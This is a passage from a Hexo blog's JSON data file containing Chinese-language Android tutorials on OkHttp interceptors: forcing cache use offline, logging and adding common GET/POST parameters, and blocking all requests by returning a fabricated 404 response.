class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> okhttp3.Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> chain.request();</span><br><span class=\"line\">        Request.<span class=\"type\">Builder</span> <span class=\"variable\">requestBuilder</span> <span class=\"operator\">=</span> request.newBuilder();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"comment\">/*手机没联网*/</span>) &#123;</span><br><span class=\"line\">            requestBuilder.cacheControl(CacheControl.FORCE_CACHE); <span class=\"comment\">// 直接使用缓存</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chain.proceed(requestBuilder.build());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">... <span class=\"comment\">// 然后记得给Client添加拦截器</span></span><br><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">CacheInterceptor</span>())</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>如此一来，断开网络后，就会正确地加载缓存数据了。</p>\n"},{"layout":"post","title":"OkHttp拦截器获取GET/POST请求参数并添加公共参数","subtitle":"拦截器玩出花。","date":"2019-07-04T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n我们在创建OkHttp客户端时，可以添加各种拦截器，真的很香：\n\n```java\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        .connectTimeout(10, TimeUnit.SECONDS)\n        .addInterceptor(new XXXInterceptor())\n        .addInterceptor(new YYYInterceptor())\n        ....\n        .build();\n```\n\n服务端经常需要我们做一些参数校验的工作，需要在本地先把请求参数封装起来再加密之类的，那么我们可以用拦截器来实现获取所有get或post参数，还可以添加一些公共参数，这样就不用在每个接口定义那去加了：\n\n```java\nprivate static class ParamsInterceptor implements Interceptor {\n    private static final String METHOD_GET = \"GET\";\n    private static final String METHOD_POST = \"POST\";\n    private static final String HEADER_KEY_USER_AGENT = \"User-Agent\";\n\n    @Override\n    public Response intercept(Chain chain) throws IOException {\n        Request request = chain.request();\n        Request.Builder requestBuilder = request.newBuilder();\n        HttpUrl.Builder urlBuilder = request.url().newBuilder();\n\n        if (METHOD_GET.equals(request.method())) { // GET方法\n            // 这里可以添加一些公共get参数\n            urlBuilder.addEncodedQueryParameter(\"key_xxx\", \"value_xxx\");\n            HttpUrl httpUrl = urlBuilder.build();\n            \n            // 打印所有get参数\n            Set<String> paramKeys = httpUrl.queryParameterNames();\n            for (String key : paramKeys) {\n                String value = httpUrl.queryParameter(key);\n                Log.d(\"TEST\", key + \" \" + value);\n            }\n            \n            // 将最终的url填充到request中\n            requestBuilder.url(httpUrl);\n        } else if (METHOD_POST.equals(request.method())) { // POST方法\n        \t// FormBody和url不太一样，若需添加公共参数，需要新建一个构造器\n            FormBody.Builder bodyBuilder = new FormBody.Builder();\n            // 把已有的post参数添加到新的构造器\n            if (request.body() instanceof FormBody) {\n                FormBody formBody = (FormBody) request.body();\n                for (int i = 0; i < formBody.size(); i++) {\n                    bodyBuilder.addEncoded(formBody.encodedName(i), formBody.encodedValue(i));\n                }\n            }\n            \n            // 这里可以添加一些公共post参数\n            bodyBuilder.addEncoded(\"key_xxx\", \"value_xxx\");\n            FormBody newBody = bodyBuilder.build();\n            \n            // 打印所有post参数\n            for (int i = 0; i < newBody.size(); i++) {\n            \tLog.d(\"TEST\", newBody.name(i) + \" \" + newBody.value(i));\n            }\n\n\t\t\t // 将最终的表单body填充到request中\n            requestBuilder.post(newBody);\n        }\n\n        // 这里我们可以添加header\n        requestBuilder.addHeader(HEADER_KEY_USER_AGENT, getUserAgent()); // 举例，调用自己业务的getUserAgent方法\n        return chain.proceed(requestBuilder.build());\n    }\n}\n```\n\n为了方便大家参考，我再补充一下import的包，因为这里OkHttp和Retrofit的一些类（比如Response）可能有重名，一定要各自用各自的，千万不要导入错了：\n\n```java\nimport okhttp3.FormBody;\nimport okhttp3.HttpUrl;\nimport okhttp3.Interceptor;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n```\n\n我没有水贴，![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190705233527983.png)。","source":"_posts/2019-07-05-OkHttp拦截器获取GET-POST请求参数并添加公共参数.md","raw":"---\nlayout:     post\ntitle:      OkHttp拦截器获取GET/POST请求参数并添加公共参数\nsubtitle:   拦截器玩出花。\ndate:       2019-07-05\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n我们在创建OkHttp客户端时，可以添加各种拦截器，真的很香：\n\n```java\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        .connectTimeout(10, TimeUnit.SECONDS)\n        .addInterceptor(new XXXInterceptor())\n        .addInterceptor(new YYYInterceptor())\n        ....\n        .build();\n```\n\n服务端经常需要我们做一些参数校验的工作，需要在本地先把请求参数封装起来再加密之类的，那么我们可以用拦截器来实现获取所有get或post参数，还可以添加一些公共参数，这样就不用在每个接口定义那去加了：\n\n```java\nprivate static class ParamsInterceptor implements Interceptor {\n    private static final String METHOD_GET = \"GET\";\n    private static final String METHOD_POST = \"POST\";\n    private static final String HEADER_KEY_USER_AGENT = \"User-Agent\";\n\n    @Override\n    public Response intercept(Chain chain) throws IOException {\n        Request request = chain.request();\n        Request.Builder requestBuilder = request.newBuilder();\n        HttpUrl.Builder urlBuilder = request.url().newBuilder();\n\n        if (METHOD_GET.equals(request.method())) { // GET方法\n            // 这里可以添加一些公共get参数\n            urlBuilder.addEncodedQueryParameter(\"key_xxx\", \"value_xxx\");\n            HttpUrl httpUrl = urlBuilder.build();\n            \n            // 打印所有get参数\n            Set<String> paramKeys = httpUrl.queryParameterNames();\n            for (String key : paramKeys) {\n                String value = httpUrl.queryParameter(key);\n                Log.d(\"TEST\", key + \" \" + value);\n            }\n            \n            // 将最终的url填充到request中\n            requestBuilder.url(httpUrl);\n        } else if (METHOD_POST.equals(request.method())) { // POST方法\n        \t// FormBody和url不太一样，若需添加公共参数，需要新建一个构造器\n            FormBody.Builder bodyBuilder = new FormBody.Builder();\n            // 把已有的post参数添加到新的构造器\n            if (request.body() instanceof FormBody) {\n                FormBody formBody = (FormBody) request.body();\n                for (int i = 0; i < formBody.size(); i++) {\n                    bodyBuilder.addEncoded(formBody.encodedName(i), formBody.encodedValue(i));\n                }\n            }\n            \n            // 这里可以添加一些公共post参数\n            bodyBuilder.addEncoded(\"key_xxx\", \"value_xxx\");\n            FormBody newBody = bodyBuilder.build();\n            \n            // 打印所有post参数\n            for (int i = 0; i < newBody.size(); i++) {\n            \tLog.d(\"TEST\", newBody.name(i) + \" \" + newBody.value(i));\n            }\n\n\t\t\t // 将最终的表单body填充到request中\n            requestBuilder.post(newBody);\n        }\n\n        // 这里我们可以添加header\n        requestBuilder.addHeader(HEADER_KEY_USER_AGENT, getUserAgent()); // 举例，调用自己业务的getUserAgent方法\n        return chain.proceed(requestBuilder.build());\n    }\n}\n```\n\n为了方便大家参考，我再补充一下import的包，因为这里OkHttp和Retrofit的一些类（比如Response）可能有重名，一定要各自用各自的，千万不要导入错了：\n\n```java\nimport okhttp3.FormBody;\nimport okhttp3.HttpUrl;\nimport okhttp3.Interceptor;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n```\n\n我没有水贴，![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190705233527983.png)。","slug":"OkHttp拦截器获取GET-POST请求参数并添加公共参数","published":1,"updated":"2024-03-25T07:31:25.854Z","comments":1,"photos":[],"link":"","_id":"cluaufh0m000ythe6f1ss4lec","content":"<p>我们在创建OkHttp客户端时，可以添加各种拦截器，真的很香：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">XXXInterceptor</span>())</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">YYYInterceptor</span>())</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>服务端经常需要我们做一些参数校验的工作，需要在本地先把请求参数封装起来再加密之类的，那么我们可以用拦截器来实现获取所有get或post参数，还可以添加一些公共参数，这样就不用在每个接口定义那去加了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ParamsInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">METHOD_GET</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;GET&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">METHOD_POST</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;POST&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">HEADER_KEY_USER_AGENT</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;User-Agent&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> chain.request();</span><br><span class=\"line\">        Request.<span class=\"type\">Builder</span> <span class=\"variable\">requestBuilder</span> <span class=\"operator\">=</span> request.newBuilder();</span><br><span class=\"line\">        HttpUrl.<span class=\"type\">Builder</span> <span class=\"variable\">urlBuilder</span> <span class=\"operator\">=</span> request.url().newBuilder();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (METHOD_GET.equals(request.method())) &#123; <span class=\"comment\">// GET方法</span></span><br><span class=\"line\">            <span class=\"comment\">// 这里可以添加一些公共get参数</span></span><br><span class=\"line\">            urlBuilder.addEncodedQueryParameter(<span class=\"string\">&quot;key_xxx&quot;</span>, <span class=\"string\">&quot;value_xxx&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">HttpUrl</span> <span class=\"variable\">httpUrl</span> <span class=\"operator\">=</span> urlBuilder.build();</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 打印所有get参数</span></span><br><span class=\"line\">            Set&lt;String&gt; paramKeys = httpUrl.queryParameterNames();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (String key : paramKeys) &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> httpUrl.queryParameter(key);</span><br><span class=\"line\">                Log.d(<span class=\"string\">&quot;TEST&quot;</span>, key + <span class=\"string\">&quot; &quot;</span> + value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 将最终的url填充到request中</span></span><br><span class=\"line\">            requestBuilder.url(httpUrl);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (METHOD_POST.equals(request.method())) &#123; <span class=\"comment\">// POST方法</span></span><br><span class=\"line\">        \t<span class=\"comment\">// FormBody和url不太一样，若需添加公共参数，需要新建一个构造器</span></span><br><span class=\"line\">            FormBody.<span class=\"type\">Builder</span> <span class=\"variable\">bodyBuilder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FormBody</span>.Builder();</span><br><span class=\"line\">            <span class=\"comment\">// 把已有的post参数添加到新的构造器</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (request.body() <span class=\"keyword\">instanceof</span> FormBody) &#123;</span><br><span class=\"line\">                <span class=\"type\">FormBody</span> <span class=\"variable\">formBody</span> <span class=\"operator\">=</span> (FormBody) request.body();</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; formBody.size(); i++) &#123;</span><br><span class=\"line\">                    bodyBuilder.addEncoded(formBody.encodedName(i), formBody.encodedValue(i));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 这里可以添加一些公共post参数</span></span><br><span class=\"line\">            bodyBuilder.addEncoded(<span class=\"string\">&quot;key_xxx&quot;</span>, <span class=\"string\">&quot;value_xxx&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">FormBody</span> <span class=\"variable\">newBody</span> <span class=\"operator\">=</span> bodyBuilder.build();</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 打印所有post参数</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; newBody.size(); i++) &#123;</span><br><span class=\"line\">            \tLog.d(<span class=\"string\">&quot;TEST&quot;</span>, newBody.name(i) + <span class=\"string\">&quot; &quot;</span> + newBody.value(i));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t <span class=\"comment\">// 将最终的表单body填充到request中</span></span><br><span class=\"line\">            requestBuilder.post(newBody);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 这里我们可以添加header</span></span><br><span class=\"line\">        requestBuilder.addHeader(HEADER_KEY_USER_AGENT, getUserAgent()); <span class=\"comment\">// 举例，调用自己业务的getUserAgent方法</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> chain.proceed(requestBuilder.build());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了方便大家参考，我再补充一下import的包，因为这里OkHttp和Retrofit的一些类（比如Response）可能有重名，一定要各自用各自的，千万不要导入错了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.FormBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.HttpUrl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.Interceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.OkHttpClient;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.Request;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.Response;</span><br></pre></td></tr></table></figure>\n\n<p>我没有水贴，<img src=\"https://imgconvert.csdnimg.cn/20190705233527983.png\" alt=\"在这里插入图片描述\">。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>我们在创建OkHttp客户端时，可以添加各种拦截器，真的很香：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">OkHttpClient</span> <span class=\"variable\">okHttpClient</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">        .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">XXXInterceptor</span>())</span><br><span class=\"line\">        .addInterceptor(<span class=\"keyword\">new</span> <span class=\"title class_\">YYYInterceptor</span>())</span><br><span class=\"line\">        ....</span><br><span class=\"line\">        .build();</span><br></pre></td></tr></table></figure>\n\n<p>服务端经常需要我们做一些参数校验的工作，需要在本地先把请求参数封装起来再加密之类的，那么我们可以用拦截器来实现获取所有get或post参数，还可以添加一些公共参数，这样就不用在每个接口定义那去加了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ParamsInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">METHOD_GET</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;GET&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">METHOD_POST</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;POST&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">HEADER_KEY_USER_AGENT</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;User-Agent&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> chain.request();</span><br><span class=\"line\">        Request.<span class=\"type\">Builder</span> <span class=\"variable\">requestBuilder</span> <span class=\"operator\">=</span> request.newBuilder();</span><br><span class=\"line\">        HttpUrl.<span class=\"type\">Builder</span> <span class=\"variable\">urlBuilder</span> <span class=\"operator\">=</span> request.url().newBuilder();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (METHOD_GET.equals(request.method())) &#123; <span class=\"comment\">// GET方法</span></span><br><span class=\"line\">            <span class=\"comment\">// 这里可以添加一些公共get参数</span></span><br><span class=\"line\">            urlBuilder.addEncodedQueryParameter(<span class=\"string\">&quot;key_xxx&quot;</span>, <span class=\"string\">&quot;value_xxx&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">HttpUrl</span> <span class=\"variable\">httpUrl</span> <span class=\"operator\">=</span> urlBuilder.build();</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 打印所有get参数</span></span><br><span class=\"line\">            Set&lt;String&gt; paramKeys = httpUrl.queryParameterNames();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (String key : paramKeys) &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> httpUrl.queryParameter(key);</span><br><span class=\"line\">                Log.d(<span class=\"string\">&quot;TEST&quot;</span>, key + <span class=\"string\">&quot; &quot;</span> + value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 将最终的url填充到request中</span></span><br><span class=\"line\">            requestBuilder.url(httpUrl);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (METHOD_POST.equals(request.method())) &#123; <span class=\"comment\">// POST方法</span></span><br><span class=\"line\">        \t<span class=\"comment\">// FormBody和url不太一样，若需添加公共参数，需要新建一个构造器</span></span><br><span class=\"line\">            FormBody.<span class=\"type\">Builder</span> <span class=\"variable\">bodyBuilder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FormBody</span>.Builder();</span><br><span class=\"line\">            <span class=\"comment\">// 把已有的post参数添加到新的构造器</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (request.body() <span class=\"keyword\">instanceof</span> FormBody) &#123;</span><br><span class=\"line\">                <span class=\"type\">FormBody</span> <span class=\"variable\">formBody</span> <span class=\"operator\">=</span> (FormBody) request.body();</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; formBody.size(); i++) &#123;</span><br><span class=\"line\">                    bodyBuilder.addEncoded(formBody.encodedName(i), formBody.encodedValue(i));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 这里可以添加一些公共post参数</span></span><br><span class=\"line\">            bodyBuilder.addEncoded(<span class=\"string\">&quot;key_xxx&quot;</span>, <span class=\"string\">&quot;value_xxx&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">FormBody</span> <span class=\"variable\">newBody</span> <span class=\"operator\">=</span> bodyBuilder.build();</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 打印所有post参数</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; newBody.size(); i++) &#123;</span><br><span class=\"line\">            \tLog.d(<span class=\"string\">&quot;TEST&quot;</span>, newBody.name(i) + <span class=\"string\">&quot; &quot;</span> + newBody.value(i));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t <span class=\"comment\">// 将最终的表单body填充到request中</span></span><br><span class=\"line\">            requestBuilder.post(newBody);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 这里我们可以添加header</span></span><br><span class=\"line\">        requestBuilder.addHeader(HEADER_KEY_USER_AGENT, getUserAgent()); <span class=\"comment\">// 举例，调用自己业务的getUserAgent方法</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> chain.proceed(requestBuilder.build());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了方便大家参考，我再补充一下import的包，因为这里OkHttp和Retrofit的一些类（比如Response）可能有重名，一定要各自用各自的，千万不要导入错了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.FormBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.HttpUrl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.Interceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.OkHttpClient;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.Request;</span><br><span class=\"line\"><span class=\"keyword\">import</span> okhttp3.Response;</span><br></pre></td></tr></table></figure>\n\n<p>我没有水贴，<img src=\"https://imgconvert.csdnimg.cn/20190705233527983.png\" alt=\"在这里插入图片描述\">。</p>\n"},{"layout":"post","title":"OkHttp拦截器实现禁止一切网络请求","subtitle":"拦截器玩出花。","date":"2019-07-05T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n我们在创建OkHttp客户端时，可以添加各种拦截器，这是我见过最有可玩性的库之一：\n\n```java\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n        .connectTimeout(10, TimeUnit.SECONDS)\n        .addInterceptor(new XXXInterceptor())\n        .addInterceptor(new YYYInterceptor())\n        ....\n        .build();\n```\n\n设想这么一个场景，用户有一个开关，可以允许或禁止应用内的一切网络请求，如何用拦截器来实现？\n为了不让大家觉得我又在水贴，直入主题。\n我们可以通过构造一个404的response来拦截请求：\n\n```java\nprivate static class NetworkInterceptor implements Interceptor {\n    @Override\n    public okhttp3.Response intercept(Chain chain) throws IOException {\n        if (/*你妈妈不准你上网*/) {\n            return new okhttp3.Response.Builder()\n                    .code(404) // 其实code可以随便给\n                    .protocol(Protocol.HTTP_2)\n                    .message(\"Network is closed by mom\")\n                    .body(ResponseBody.create(MediaType.get(\"text/html; charset=utf-8\"), \"\")) // 返回空页面\n                    .request(chain.request())\n                    .build();            \n        } else {\n            return chain.proceed(chain.request());                    \n        }\n    }\n}\n```\n\n一定要记住哦，code，protocol，message，body缺一不可。\n","source":"_posts/2019-07-06-OkHttp拦截器实现禁止一切网络请求.md","raw":"---\nlayout:     post\ntitle:      OkHttp拦截器实现禁止一切网络请求\nsubtitle:   拦截器玩出花。\ndate:       2019-07-06\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 